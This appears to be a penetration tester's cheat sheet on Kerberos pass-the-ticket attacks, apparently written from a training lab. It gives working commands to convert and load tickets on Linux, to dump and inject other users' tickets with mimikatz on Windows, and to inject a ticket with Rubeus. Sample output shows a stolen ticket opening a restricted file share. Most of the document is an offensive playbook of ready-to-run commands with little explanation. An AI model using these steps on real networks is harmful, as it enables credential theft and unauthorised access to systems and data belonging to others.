


# Linux

Usually what you can do is export a ticket in anyway, but my preferred method is

```
echo "BASE_64_TICKET_HERE" | base64 -d >> ticket.kirbi
```


Then you basically copy paste that ticket and hit it with

```
ticketConverter.py ticket.kirbi ticket.ccache
```

Now all thats left is to export and then test with any tool you want

```
export KRB5CCNAME=/tmp/ticket.ccache
```


# Windows

## Mimikatz
Involves stealing another users Kerberos ticket on the local machine with `mimikatz` to gain access to a resource

```
privilege::debug
sekurlsa::tickets /export
```

We can now verify newly generated tickets with the following command

```bash
PS C:\Tools> dir *.kirbi


    Directory: C:\Tools


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/14/2022   6:24 AM           1561 [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;12bd0]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c6860]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c6860]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c7bcc]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c7bcc]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c933d]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c933d]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1ca6c2]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1ca6c2]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
...
```

For this example, we can pick any TGS ticket in the `dave@cifs-web04.kirbi` format and inject it with `mimikatz`

```powershell
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

We can now check if the ticket was loaded properly

```powershell
PS C:\Tools> klist

Current LogonId is 0:0x13bca7

Cached Tickets: (1)

#0>     Client: dave @ CORP.COM
        Server: cifs/web04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
        Start Time: 9/14/2022 5:31:32 (local)
        End Time:   9/14/2022 15:31:13 (local)
        Renew Time: 9/21/2022 5:31:13 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

We see that the `dave` ticket has been successfully imported in our own session for the `jen` user. We can now confirm that we have been granted access to an origianlly restricted shared folder

```
PS C:\Tools> ls \\web04\backup


    Directory: \\web04\backup


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/13/2022   2:52 AM              0 backup_schemata.txt
```


## Rubeus

```
Rubeus.exe ptt /ticket:<ticket.kirbi>
```